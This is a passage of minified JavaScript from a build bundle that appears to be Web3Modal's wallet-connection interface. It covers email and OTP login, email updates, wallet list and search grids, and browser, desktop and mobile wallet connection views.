this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_SWITCH_NETWORK,payload:{chainId:e}}),new Promise((n,r)=>{this.switchChainResolver={resolve:n,reject:r}})}async disconnect(){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_SIGN_OUT}),new Promise((e,n)=>{this.disconnectResolver={resolve:e,reject:n}})}async request(e){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_RPC_REQUEST,payload:e}),new Promise((n,r)=>{this.rpcRequestResolver={resolve:n,reject:r}})}onRpcRequest(e){this.w3mFrame.events.onAppEvent(n=>{n.type.includes(ae.RPC_METHOD_KEY)&&e(n)})}onRpcResponse(e){this.w3mFrame.events.onFrameEvent(n=>{n.type.includes(ae.RPC_METHOD_KEY)&&e(n)})}onIsConnected(e){this.w3mFrame.events.onFrameEvent(n=>{n.type===ae.FRAME_GET_USER_SUCCESS&&e()})}onConnectEmailSuccess(e){var n;(n=this.connectEmailResolver)==null||n.resolve(e.payload),this.setNewLastEmailLoginTime()}onConnectEmailError(e){var n;(n=this.connectEmailResolver)==null||n.reject(e.payload.message)}onConnectDeviceSuccess(){var e;(e=this.connectDeviceResolver)==null||e.resolve(void 0)}onConnectDeviceError(e){var n;(n=this.connectDeviceResolver)==null||n.reject(e.payload.message)}onConnectOtpSuccess(){var e;(e=this.connectOtpResolver)==null||e.resolve(void 0)}onConnectOtpError(e){var n;(n=this.connectOtpResolver)==null||n.reject(e.payload.message)}onConnectSuccess(e){var n;this.setEmailLoginSuccess(e.payload.email),this.setLastUsedChainId(e.payload.chainId),(n=this.connectResolver)==null||n.resolve(e.payload)}onConnectError(e){var n;(n=this.connectResolver)==null||n.reject(e.payload.message)}onIsConnectedSuccess(e){var n;e.payload.isConnected||this.deleteEmailLoginCache(),(n=this.isConnectedResolver)==null||n.resolve(e.payload)}onIsConnectedError(e){var n;(n=this.isConnectedResolver)==null||n.reject(e.payload.message)}onGetChainIdSuccess(e){var n;this.setLastUsedChainId(e.payload.chainId),(n=this.getChainIdResolver)==null||n.resolve(e.payload)}onGetChainIdError(e){var n;(n=this.getChainIdResolver)==null||n.reject(e.payload.message)}onSignOutSuccess(){var e;(e=this.disconnectResolver)==null||e.resolve(void 0),this.deleteEmailLoginCache()}onSignOutError(e){var n;(n=this.disconnectResolver)==null||n.reject(e.payload.message)}onSwitchChainSuccess(e){var n;this.setLastUsedChainId(e.payload.chainId),(n=this.switchChainResolver)==null||n.resolve(e.payload)}onSwitchChainError(e){var n;(n=this.switchChainResolver)==null||n.reject(e.payload.message)}onRpcRequestSuccess(e){var n;(n=this.rpcRequestResolver)==null||n.resolve(e.payload)}onRpcRequestError(e){var n;(n=this.rpcRequestResolver)==null||n.reject(e.payload.message)}onSessionUpdate(e){}onUpdateEmailSuccess(){var e;(e=this.updateEmailResolver)==null||e.resolve(void 0),this.setNewLastEmailLoginTime()}onUpdateEmailError(e){var n;(n=this.updateEmailResolver)==null||n.reject(e.payload.message)}onAwaitUpdateEmailSuccess(e){var n;this.setEmailLoginSuccess(e.payload.email),(n=this.awaitUpdateEmailResolver)==null||n.resolve(e.payload)}onAwaitUpdateEmailError(e){var n;(n=this.awaitUpdateEmailResolver)==null||n.reject(e.payload.message)}onSyncThemeSuccess(){var e;(e=this.syncThemeResolver)==null||e.resolve(void 0)}onSyncThemeError(e){var n;(n=this.syncThemeResolver)==null||n.reject(e.payload.message)}setNewLastEmailLoginTime(){Bt.set(ae.LAST_EMAIL_LOGIN_TIME,Date.now().toString())}setEmailLoginSuccess(e){Bt.set(ae.EMAIL,e),Bt.set(ae.EMAIL_LOGIN_USED_KEY,"true"),Bt.delete(ae.LAST_EMAIL_LOGIN_TIME)}deleteEmailLoginCache(){Bt.delete(ae.EMAIL_LOGIN_USED_KEY),Bt.delete(ae.EMAIL),Bt.delete(ae.LAST_USED_CHAIN_KEY)}setLastUsedChainId(e){Bt.set(ae.LAST_USED_CHAIN_KEY,`${e}`)}getLastUsedChainId(){return Number(Bt.get(ae.LAST_USED_CHAIN_KEY))}}var Kc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const E4=6;let eo=class extends H{constructor(){var e;super(...arguments),this.email=(e=ie.state.data)==null?void 0:e.email,this.emailConnector=We.getEmailConnector(),this.loading=!1,this.timeoutTimeLeft=Ta.getTimeToNextEmailLogin(),this.error=""}firstUpdated(){this.startOTPTimeout()}disconnectedCallback(){clearTimeout(this.OTPTimeout)}render(){if(!this.email)throw new Error("w3m-email-verify-otp-view: No email provided");const e=!!this.timeoutTimeLeft;return $`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["l","0","l","0"]}
        gap="l"
      >
        <wui-flex flexDirection="column" alignItems="center">
          <wui-text variant="paragraph-400" color="fg-100"> Enter the code we sent to </wui-text>
          <wui-text variant="paragraph-500" color="fg-100">${this.email}</wui-text>
        </wui-flex>

        <wui-text variant="small-400" color="fg-200">The code expires in 20 minutes</wui-text>

        ${this.loading?$`<wui-loading-spinner size="xl" color="accent-100"></wui-loading-spinner>`:$` <wui-flex flexDirection="column" alignItems="center" gap="xs">
              <wui-otp
                dissabled
                length="6"
                @inputChange=${this.onOtpInputChange.bind(this)}
              ></wui-otp>
              ${this.error?$`<wui-text variant="small-400" color="error-100"
                    >${this.error}. Try Again</wui-text
                  >`:null}
            </wui-flex>`}

        <wui-flex alignItems="center">
          <wui-text variant="small-400" color="fg-200">Didn't receive it?</wui-text>
          <wui-link @click=${this.onResendCode.bind(this)} .disabled=${e}>
            Resend ${e?`in ${this.timeoutTimeLeft}s`:"Code"}
          </wui-link>
        </wui-flex>
      </wui-flex>
    `}startOTPTimeout(){this.OTPTimeout=setInterval(()=>{this.timeoutTimeLeft>0?this.timeoutTimeLeft=Ta.getTimeToNextEmailLogin():clearInterval(this.OTPTimeout)},1e3)}async onOtpInputChange(e){try{if(!this.loading){const n=e.detail;this.emailConnector&&n.length===E4&&(this.loading=!0,await this.emailConnector.provider.connectOtp({otp:n}),we.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_PASS"}),await Re.connectExternal(this.emailConnector),ze.close(),we.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"email"}}))}}catch(n){we.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_FAIL"}),this.error=le.parseError(n),this.loading=!1}}async onResendCode(){try{if(!this.loading&&!this.timeoutTimeLeft){const e=We.getEmailConnector();if(!e||!this.email)throw new Error("w3m-email-login-widget: Unable to resend email");this.loading=!0,await e.provider.connectEmail({email:this.email}),we.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_SENT"}),this.startOTPTimeout(),et.showSuccess("Code email resent")}}catch(e){et.showError(e)}finally{this.loading=!1}}};eo.styles=Q5;Kc([ee()],eo.prototype,"loading",void 0);Kc([ee()],eo.prototype,"timeoutTimeLeft",void 0);Kc([ee()],eo.prototype,"error",void 0);eo=Kc([z("w3m-email-verify-otp-view")],eo);const C4=q`
  wui-icon-box {
    height: var(--wui-icon-box-size-xl);
    width: var(--wui-icon-box-size-xl);
  }
`;var x1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ec=class extends H{constructor(){var e;super(),this.email=(e=ie.state.data)==null?void 0:e.email,this.emailConnector=We.getEmailConnector(),this.loading=!1,this.listenForDeviceApproval()}render(){if(!this.email)throw new Error("w3m-email-verify-device-view: No email provided");if(!this.emailConnector)throw new Error("w3m-email-verify-device-view: No email connector provided");return $`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["xxl","s","xxl","s"]}
        gap="l"
      >
        <wui-icon-box
          size="xl"
          iconcolor="accent-100"
          backgroundcolor="accent-100"
          icon="verify"
          background="opaque"
        ></wui-icon-box>

        <wui-flex flexDirection="column" alignItems="center" gap="s">
          <wui-flex flexDirection="column" alignItems="center">
            <wui-text variant="paragraph-400" color="fg-100">
              Approve the login link we sent to
            </wui-text>
            <wui-text variant="paragraph-400" color="fg-100"><b>${this.email}</b></wui-text>
          </wui-flex>

          <wui-text variant="small-400" color="fg-200" align="center">
            The code expires in 20 minutes
          </wui-text>

          <wui-flex alignItems="center" id="w3m-resend-section">
            <wui-text variant="small-400" color="fg-100" align="center">
              Didn't receive it?
            </wui-text>
            <wui-link @click=${this.onResendCode.bind(this)} .disabled=${this.loading}>
              Resend email
            </wui-link>
          </wui-flex>
        </wui-flex>
      </wui-flex>
    `}async listenForDeviceApproval(){this.emailConnector&&(await this.emailConnector.provider.connectDevice(),we.sendEvent({type:"track",event:"DEVICE_REGISTERED_FOR_EMAIL"}),we.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_SENT"}),ie.replace("EmailVerifyOtp",{email:this.email}))}async onResendCode(){try{if(!this.loading){if(!this.emailConnector||!this.email)throw new Error("w3m-email-login-widget: Unable to resend email");this.loading=!0,await this.emailConnector.provider.connectEmail({email:this.email}),et.showSuccess("Code email resent")}}catch(e){et.showError(e)}finally{this.loading=!1}}};ec.styles=C4;x1([ee()],ec.prototype,"loading",void 0);ec=x1([z("w3m-email-verify-device-view")],ec);const S4=q`
  div {
    width: 100%;
    height: 400px;
  }

  [data-ready='false'] {
    transform: scale(1.05);
  }

  @media (max-width: 430px) {
    [data-ready='false'] {
      transform: translateY(-50px);
    }
  }
`;var _1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let tc=class extends H{constructor(){super(),this.bodyObserver=void 0,this.unsubscribe=[],this.iframe=document.getElementById("w3m-iframe"),this.ready=!1,this.unsubscribe.push(ze.subscribeKey("open",e=>{e||this.onHideIframe()}))}disconnectedCallback(){var e;this.unsubscribe.forEach(n=>n()),(e=this.bodyObserver)==null||e.unobserve(window.document.body)}firstUpdated(){this.iframe.style.display="block";const n=this.renderRoot.querySelector("div");this.bodyObserver=new ResizeObserver(()=>{const o=(n==null?void 0:n.getBoundingClientRect())??{left:0,top:0,width:0,height:0};this.iframe.style.width=`${o.width}px`,this.iframe.style.height=`${o.height-10}px`,this.iframe.style.left=`${o.left}px`,this.iframe.style.top=`${o.top+10/2}px`,this.ready=!0}),this.bodyObserver.observe(window.document.body)}render(){return this.ready&&this.onShowIframe(),$`<div data-ready=${this.ready}></div>`}onShowIframe(){const e=window.innerWidth<=430;this.iframe.animate([{opacity:0,transform:e?"translateY(50px)":"scale(.95)"},{opacity:1,transform:e?"translateY(0)":"scale(1)"}],{duration:200,easing:"ease",fill:"forwards",delay:300})}async onHideIframe(){await this.iframe.animate([{opacity:1},{opacity:0}],{duration:200,easing:"ease",fill:"forwards"}).finished,this.iframe.style.display="none"}};tc.styles=S4;_1([ee()],tc.prototype,"ready",void 0);tc=_1([z("w3m-approve-transaction-view")],tc);var A4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let y0=class extends H{render(){return $`
      <wui-flex flexDirection="column" alignItems="center" gap="xl" padding="xl">
        <wui-text variant="paragraph-400" color="fg-100">Follow the instructions on</wui-text>
        <wui-chip
          icon="externalLink"
          variant="fill"
          href=${Bn.SECURE_SITE_DASHBOARD}
          imageSrc=${Bn.SECURE_SITE_FAVICON}
        >
        </wui-chip>
        <wui-text variant="small-400" color="fg-200">
          You will have to reconnect for security reasons
        </wui-text>
      </wui-flex>
    `}};y0=A4([z("w3m-upgrade-wallet-view")],y0);const T4=q`
  wui-email-input {
    width: 100%;
  }

  form {
    width: 100%;
    display: block;
    position: relative;
  }
`;var Jd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Ia=class extends H{constructor(){var e;super(...arguments),this.formRef=Uc(),this.initialValue=((e=ie.state.data)==null?void 0:e.email)??"",this.email="",this.loading=!1}firstUpdated(){var e;(e=this.formRef.value)==null||e.addEventListener("keydown",n=>{n.key==="Enter"&&this.onSubmitEmail(n)})}render(){const e=!this.loading&&this.email.length>3&&this.email!==this.initialValue;return $`
      <wui-flex flexDirection="column" padding="m" gap="m">
        <form ${Bc(this.formRef)} @submit=${this.onSubmitEmail.bind(this)}>
          <wui-email-input
            value=${this.initialValue}
            .disabled=${this.loading}
            @inputChange=${this.onEmailInputChange.bind(this)}
          >
          </wui-email-input>
          <input type="submit" hidden />
        </form>

        <wui-flex gap="s">
          <wui-button size="md" variant="shade" fullWidth @click=${ie.goBack}>
            Cancel
          </wui-button>

          <wui-button
            size="md"
            variant="fill"
            fullWidth
            @click=${this.onSubmitEmail.bind(this)}
            .disabled=${!e}
            .loading=${this.loading}
          >
            Save
          </wui-button>
        </wui-flex>
      </wui-flex>
    `}onEmailInputChange(e){this.email=e.detail}async onSubmitEmail(e){try{if(this.loading)return;this.loading=!0,e.preventDefault();const n=We.getEmailConnector();if(!n)throw new Error("w3m-update-email-wallet: Email connector not found");await n.provider.updateEmail({email:this.email}),we.sendEvent({type:"track",event:"EMAIL_EDIT"}),ie.replace("UpdateEmailWalletWaiting",{email:this.email})}catch(n){et.showError(n),this.loading=!1}}};Ia.styles=T4;Jd([ee()],Ia.prototype,"email",void 0);Jd([ee()],Ia.prototype,"loading",void 0);Ia=Jd([z("w3m-update-email-wallet-view")],Ia);const I4=q`
  wui-icon-box {
    height: var(--wui-icon-box-size-xl);
    width: var(--wui-icon-box-size-xl);
  }
`;var E1=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let nc=class extends H{constructor(){var e;super(),this.email=(e=ie.state.data)==null?void 0:e.email,this.emailConnector=We.getEmailConnector(),this.loading=!1,this.listenForEmailUpdateApproval()}render(){if(!this.email)throw new Error("w3m-update-email-wallet-waiting-view: No email provided");if(!this.emailConnector)throw new Error("w3m-update-email-wallet-waiting-view: No email connector provided");return $`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["xxl","s","xxl","s"]}
        gap="l"
      >
        <wui-icon-box
          size="xl"
          iconcolor="accent-100"
          backgroundcolor="accent-100"
          icon="mail"
          background="opaque"
        ></wui-icon-box>

        <wui-flex flexDirection="column" alignItems="center" gap="s">
          <wui-flex flexDirection="column" alignItems="center">
            <wui-text variant="paragraph-400" color="fg-100">
              Approve verification link we sent to
            </wui-text>
            <wui-text variant="paragraph-400" color="fg-100">${this.email}</wui-text>
          </wui-flex>

          <wui-text variant="small-400" color="fg-200" align="center">
            You will receive an approval request on your former mail to confirm the new one
          </wui-text>

          <wui-flex alignItems="center" id="w3m-resend-section">
            <wui-text variant="small-400" color="fg-100" align="center">
              Didn't receive it?
            </wui-text>
            <wui-link @click=${this.onResendCode.bind(this)} .disabled=${this.loading}>
              Resend email
            </wui-link>
          </wui-flex>
        </wui-flex>
      </wui-flex>
    `}async listenForEmailUpdateApproval(){this.emailConnector&&(await this.emailConnector.provider.awaitUpdateEmail(),ie.replace("Account"),et.showSuccess("Email updated"))}async onResendCode(){try{if(!this.loading){if(!this.emailConnector||!this.email)throw new Error("w3m-update-email-wallet-waiting-view: Unable to resend email");this.loading=!0,await this.emailConnector.provider.updateEmail({email:this.email}),this.listenForEmailUpdateApproval(),et.showSuccess("Code email resent")}}catch(e){et.showError(e)}finally{this.loading=!1}}};nc.styles=I4;E1([ee()],nc.prototype,"loading",void 0);nc=E1([z("w3m-update-email-wallet-waiting-view")],nc);const $4=q`
  wui-grid {
    max-height: clamp(360px, 400px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 76px);
  }

  @media (max-width: 435px) {
    wui-grid {
      grid-template-columns: repeat(auto-fill, 77px);
    }
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    padding-top: var(--wui-spacing-l);
    padding-bottom: var(--wui-spacing-l);
    justify-content: center;
    grid-column: 1 / span 4;
  }
`;function C1(t){const{connectors:e}=We.state,n=e.filter(i=>i.type==="ANNOUNCED").reduce((i,a)=>{var s;return(s=a.info)!=null&&s.rdns&&(i[a.info.rdns]=!0),i},{});return t.map(i=>({...i,installed:!!i.rdns&&!!n[i.rdns??""]})).sort((i,a)=>Number(a.installed)-Number(i.installed))}var Ya=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const v0="local-paginator";let ci=class extends H{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.initial=!Pe.state.wallets.length,this.wallets=Pe.state.wallets,this.recommended=Pe.state.recommended,this.featured=Pe.state.featured,this.unsubscribe.push(Pe.subscribeKey("wallets",e=>this.wallets=e),Pe.subscribeKey("recommended",e=>this.recommended=e),Pe.subscribeKey("featured",e=>this.featured=e))}firstUpdated(){this.initialFetch(),this.createPaginationObserver()}disconnectedCallback(){var e;this.unsubscribe.forEach(n=>n()),(e=this.paginationObserver)==null||e.disconnect()}render(){return $`
      <wui-grid
        data-scroll=${!this.initial}
        .padding=${["0","s","s","s"]}
        columnGap="xxs"
        rowGap="l"
        justifyContent="space-between"
      >
        ${this.initial?this.shimmerTemplate(16):this.walletsTemplate()}
        ${this.paginationLoaderTemplate()}
      </wui-grid>
    `}async initialFetch(){var n;const e=(n=this.shadowRoot)==null?void 0:n.querySelector("wui-grid");this.initial&&e&&(await Pe.fetchWallets({page:1}),await e.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.initial=!1,e.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}shimmerTemplate(e,n){return[...Array(e)].map(()=>$`
        <wui-card-select-loader type="wallet" id=${ve(n)}></wui-card-select-loader>
      `)}walletsTemplate(){const e=[...this.featured,...this.recommended,...this.wallets];return C1(e).map(r=>$`
        <wui-card-select
          imageSrc=${ve(Xe.getWalletImage(r))}
          type="wallet"
          name=${r.name}
          @click=${()=>this.onConnectWallet(r)}
          .installed=${r.installed}
        ></wui-card-select>
      `)}paginationLoaderTemplate(){const{wallets:e,recommended:n,featured:r,count:o}=Pe.state,i=window.innerWidth<352?3:4,a=e.length+n.length;let c=Math.ceil(a/i)*i-a+i;return c-=e.length?r.length%i:0,o===0&&r.length>0?null:o===0||[...r,...e,...n].length<o?this.shimmerTemplate(c,v0):null}createPaginationObserver(){var n;const e=(n=this.shadowRoot)==null?void 0:n.querySelector(`#${v0}`);e&&(this.paginationObserver=new IntersectionObserver(([r])=>{if(r!=null&&r.isIntersecting&&!this.initial){const{page:o,count:i,wallets:a}=Pe.state;a.length<i&&Pe.fetchWallets({page:o+1})}}),this.paginationObserver.observe(e))}onConnectWallet(e){const{connectors:n}=We.state,r=n.find(({explorerId:o})=>o===e.id);r?ie.push("ConnectingExternal",{connector:r}):ie.push("ConnectingWalletConnect",{wallet:e})}};ci.styles=$4;Ya([ee()],ci.prototype,"initial",void 0);Ya([ee()],ci.prototype,"wallets",void 0);Ya([ee()],ci.prototype,"recommended",void 0);Ya([ee()],ci.prototype,"featured",void 0);ci=Ya([z("w3m-all-wallets-list")],ci);const O4=q`
  wui-grid,
  wui-loading-spinner,
  wui-flex {
    height: 360px;
  }

  wui-grid {
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    justify-content: center;
    align-items: center;
  }
`;var Xd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let $a=class extends H{constructor(){super(...arguments),this.prevQuery="",this.loading=!0,this.query=""}render(){return this.onSearch(),this.loading?$`<wui-loading-spinner color="accent-100"></wui-loading-spinner>`:this.walletsTemplate()}async onSearch(){this.query!==this.prevQuery&&(this.prevQuery=this.query,this.loading=!0,await Pe.searchWallet({search:this.query}),this.loading=!1)}walletsTemplate(){const{search:e}=Pe.state,n=C1(e);return e.length?$`
      <wui-grid
        .padding=${["0","s","s","s"]}
        gridTemplateColumns="repeat(4, 1fr)"
        rowGap="l"
        columnGap="xs"
      >
        ${n.map(r=>$`
            <wui-card-select
              imageSrc=${ve(Xe.getWalletImage(r))}
              type="wallet"
              name=${r.name}
              @click=${()=>this.onConnectWallet(r)}
              .installed=${r.installed}
            ></wui-card-select>
          `)}
      </wui-grid>
    `:$`
        <wui-flex justifyContent="center" alignItems="center" gap="s" flexDirection="column">
          <wui-icon-box
            size="lg"
            iconColor="fg-200"
            backgroundColor="fg-300"
            icon="wallet"
            background="transparent"
          ></wui-icon-box>
          <wui-text color="fg-200" variant="paragraph-500">No Wallet found</wui-text>
        </wui-flex>
      `}onConnectWallet(e){const{connectors:n}=We.state,r=n.find(({explorerId:o})=>o===e.id);r?ie.push("ConnectingExternal",{connector:r}):ie.push("ConnectingWalletConnect",{wallet:e})}};$a.styles=O4;Xd([ee()],$a.prototype,"loading",void 0);Xd([O()],$a.prototype,"query",void 0);$a=Xd([z("w3m-all-wallets-search")],$a);var Yc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Oa=class extends H{constructor(){super(),this.platformTabs=[],this.unsubscribe=[],this.platforms=[],this.onSelectPlatfrom=void 0,this.buffering=!1,this.unsubscribe.push(Re.subscribeKey("buffering",e=>this.buffering=e))}disconnectCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.generateTabs();return $`
      <wui-flex justifyContent="center" .padding=${["l","0","0","0"]}>
        <wui-tabs
          ?disabled=${this.buffering}
          .tabs=${e}
          .onTabChange=${this.onTabChange.bind(this)}
        ></wui-tabs>
      </wui-flex>
    `}generateTabs(){const e=this.platforms.map(n=>n==="browser"?{label:"Browser",icon:"extension",platform:"browser"}:n==="mobile"?{label:"Mobile",icon:"mobile",platform:"mobile"}:n==="qrcode"?{label:"Mobile",icon:"mobile",platform:"qrcode"}:n==="web"?{label:"Webapp",icon:"browser",platform:"web"}:n==="desktop"?{label:"Desktop",icon:"desktop",platform:"desktop"}:{label:"Browser",icon:"extension",platform:"unsupported"});return this.platformTabs=e.map(({platform:n})=>n),e}onTabChange(e){var r;const n=this.platformTabs[e];n&&((r=this.onSelectPlatfrom)==null||r.call(this,n))}};Yc([O({type:Array})],Oa.prototype,"platforms",void 0);Yc([O()],Oa.prototype,"onSelectPlatfrom",void 0);Yc([ee()],Oa.prototype,"buffering",void 0);Oa=Yc([z("w3m-connecting-header")],Oa);var P4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let x0=class extends Nt{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-browser: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),we.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}async onConnectProxy(){try{this.error=!1;const{connectors:e}=We.state,n=e.find(o=>{var i,a;return o.type==="ANNOUNCED"&&((i=o.info)==null?void 0:i.rdns)===((a=this.wallet)==null?void 0:a.rdns)}),r=e.find(o=>o.type==="INJECTED");n?await Re.connectExternal(n):r&&await Re.connectExternal(r),ze.close(),we.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"browser"}})}catch(e){we.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(e==null?void 0:e.message)??"Unknown"}}),this.error=!0}}};x0=P4([z("w3m-connecting-wc-browser")],x0);var D4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let _0=class extends Nt{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-desktop: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),we.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"desktop"}})}onRenderProxy(){!this.ready&&this.uri&&(this.ready=!0,this.timeout=setTimeout(()=>{var e;(e=this.onConnect)==null||e.call(this)},200))}onConnectProxy(){var e;if((e=this.wallet)!=null&&e.desktop_link&&this.uri)try{this.error=!1;const{desktop_link:n,name:r}=this.wallet,{redirect:o,href:i}=le.formatNativeUrl(n,this.uri);Re.setWcLinking({name:r,href:i}),Re.setRecentWallet(this.wallet),le.openHref(o,"_self")}catch{this.error=!0}}};_0=D4([z("w3m-connecting-wc-desktop")],_0);var R4=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let E0=class extends Nt{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-mobile: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),document.addEventListener("visibilitychange",this.onBuffering.bind(this)),we.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"mobile"}})}disconnectedCallback(){super.disconnectedCallback(),document.removeEventListener("visibilitychange",this.onBuffering.bind(this))}onRenderProxy(){var e;!this.ready&&this.uri&&(this.ready=!0,(e=this.onConnect)==null||e.call(this))}onConnectProxy(){var e;if((e=this.wallet)!=null&&e.mobile_link&&this.uri)try{this.error=!1;const{mobile_link:n,name:r}=this.wallet,{redirect:o,href:i}=le.formatNativeUrl(n,this.uri);Re.setWcLinking({name:r,href:i}),Re.setRecentWallet(this.wallet),le.openHref(o,"_self")}catch{this.error=!0}}onBuffering(){const e=le.isIos();(document==null?void 0:document.visibilityState)==="visible"&&!this.error&&e&&(Re.setBuffering(!0),setTimeout(()=>{Re.setBuffering(!1)},5e3))}};E0=R4([z("w3m-connecting-wc-mobile")],E0);const N4=q`
  @keyframes fadein {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  wui-shimmer {
    width: 100%;
    aspect-ratio: 1 / 1;
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px) !important;
  }

  wui-qr-code {
    opacity: 0;
    animation-duration: 200ms;
    animation-timing-function: ease;
    animation-name: fadein;
    animation-fill-mode: forwards;
  }
